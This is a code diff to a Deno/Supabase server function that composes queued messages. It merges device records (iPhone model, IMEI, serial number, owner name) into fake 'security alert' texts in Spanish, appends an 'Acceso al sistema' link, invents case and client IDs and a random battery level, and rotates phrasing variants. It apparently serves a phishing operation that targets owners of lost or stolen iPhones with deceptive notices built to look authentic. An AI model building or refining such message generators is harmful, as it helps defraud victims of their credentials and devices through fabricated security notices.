@@ -170,26 +170,22 @@ Deno.serve(async (req) => {
       throw profileError;
     }
 
-    // If message has a template_id but no content was generated yet, generate it now
-    if (queuedMessage.template_id && queuedMessage.message_content.includes('{')) {
-      console.log('Generating message from template:', queuedMessage.template_id);
-      
+    // Compose final message content
+    if (queuedMessage.template_id) {
+      console.log('Composing message (template path):', queuedMessage.template_id);
+
       const { data: template } = await supabase
         .from('message_templates')
         .select('template_content')
         .eq('id', queuedMessage.template_id)
         .single();
 
-      if (template) {
-        // Generate IDs
-        const now = new Date();
-        const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
-        const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
-        const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
-        const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
-        
-        // Replace variables in template with actual process data
-        let customSection = template.template_content
+      // Start from existing content to preserve any prefilled text
+      let customSection = (queuedMessage.message_content || '').toString();
+
+      // If we have a template, apply variable replacements regardless of current placeholders
+      if (template?.template_content) {
+        customSection = template.template_content
           .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
           .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
           .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
@@ -198,72 +194,53 @@ Deno.serve(async (req) => {
           .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
           .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
           .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '');
+      }
 
-        // Add URL if available
-        if (queuedMessage.processes?.url) {
-          customSection += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
-        }
+      // Add URL if available and not already present
+      if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
+        customSection += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
+      }
 
-        // Build complete message with random variations
-        const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
-        
-        const openings = [
-          "🛡️ Alerta de seguridad del sistema",
-          "🔐 Notificación de seguridad",
-          "🔒 Sistema de protección activado"
-        ];
-        
-        const statusPhrases = [
-          "Detalles del dispositivo:",
-          "Información del equipo:",
-          "Datos técnicos:"
-        ];
-        
-        const deviceSections = [
-          `• Modelo: ${queuedMessage.processes?.iphone_model}
-• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}
-• IMEI: ${queuedMessage.processes?.imei}
-• Serie: ${queuedMessage.processes?.serial_number}
-• Nivel de batería: ${battery} %`,
-          
-          `• Dispositivo: ${queuedMessage.processes?.iphone_model}
-• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}
-• Código IMEI: ${queuedMessage.processes?.imei}
-• No. Serie: ${queuedMessage.processes?.serial_number}
-• Batería actual: ${battery} %`,
+      // Generate IDs and battery only to enrich the final message
+      const now = new Date();
+      const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
+      const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
+      const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
+      const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
 
-          `• Equipo: ${queuedMessage.processes?.iphone_model}
-• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}
-• Identificador IMEI: ${queuedMessage.processes?.imei}
-• Número de serie: ${queuedMessage.processes?.serial_number}
-• Carga restante: ${battery} %`
-        ];
-        
-        const helpPhrases = [
-          "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
-          "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
-          "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
-        ];
-        
-        const closings = [
-          "Servicio automatizado – Atención disponible 24 h",
-          "Sistema automático – Soporte activo 24/7",
-          "Monitoreo continuo – Asistencia permanente"
-        ];
+      // New message layout (same for templates and non-templates)
+      const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
+      const openings = [
+        '🛡️ Alerta de seguridad del sistema',
+        '🔐 Notificación de seguridad',
+        '🔒 Sistema de protección activado',
+      ];
+      const statusPhrases = [
+        'Detalles del dispositivo:',
+        'Información del equipo:',
+        'Datos técnicos:',
+      ];
+      const deviceSections = [
+        `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
+        `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
+        `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
+      ];
+      const helpPhrases = [
+        '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
+        '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
+        '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
+      ];
+      const closings = [
+        'Servicio automatizado – Atención disponible 24 h',
+        'Sistema automático – Soporte activo 24/7',
+        'Monitoreo continuo – Asistencia permanente',
+      ];
 
-        // Build complete message: opening + custom section + IDs + device + help + closing
-        queuedMessage.message_content = `${random(openings)}
-
-${customSection}
-
-ID de caso: ${caseId}
-ID de cliente: ${clientId}
-
-${random(statusPhrases)}
-${random(deviceSections)}
-
-${random(helpPhrases)}
-${random(closings)}`;
+      queuedMessage.message_content = `${random(openings)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrases)}\n${random(deviceSections)}\n\n${random(helpPhrases)}\n${random(closings)}`;
+    } else {
+      // Non-template path: ensure URL is included if available
+      if (queuedMessage.processes?.url && queuedMessage.message_content && !queuedMessage.message_content.includes(queuedMessage.processes.url)) {
+        queuedMessage.message_content += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
       }
     }
 
